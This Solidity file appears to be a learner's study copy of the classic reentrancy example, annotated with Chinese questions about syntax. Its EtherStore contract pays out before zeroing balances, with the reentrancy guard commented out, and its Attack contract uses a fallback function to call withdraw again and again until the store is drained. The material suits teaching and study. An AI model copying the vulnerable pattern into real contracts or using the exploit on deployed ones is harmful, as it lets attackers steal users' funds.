// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherStore{
    mapping(address => uint ) public balances;

    // bool internal locked;

    // modifier noReentrancy(){
    //     require(!locked,"No re-entrancy");
    //     locked = true;
    //     _;
    //     locked = false;
    // }

//1 payable 表示函数可以接收还是发送 ether? 
    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal >0);

//2call 用法
        (bool sent,) = msg.sender.call{value: bal}("");   
        //3requie支持 option message?
        require(sent,"Failed to send Ether");
    
        //msg.sender的状态还没有更新，新的withdraw请求就进来了【并发安全....只不过这里的危害体现在了钱上】
        balances[msg.sender] = 0;
    }

//4 view用法？
    function getBalance() public view returns(uint){
        
//5 address用法？ this作用? 更新到7天系列
        return address(this).balance;
    }
}

contract Attack{
    //6在另一个合约中初始化合约
    EtherStore public etherStore;

    constructor(address _etherStoreAddress){
        //6.1 对合约实例化  ？啥意思代码
        etherStore = EtherStore(_etherStoreAddress);
    }

    //7fallback使用方法及规定？
    fallback() external payable{
        //6.2 合约调用自己的属性和方法 方式？
        if (address(etherStore).balance >= 1 ether){
            etherStore.withdraw();
        }
    }

    function attack() external payable{
        require(msg.value>= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}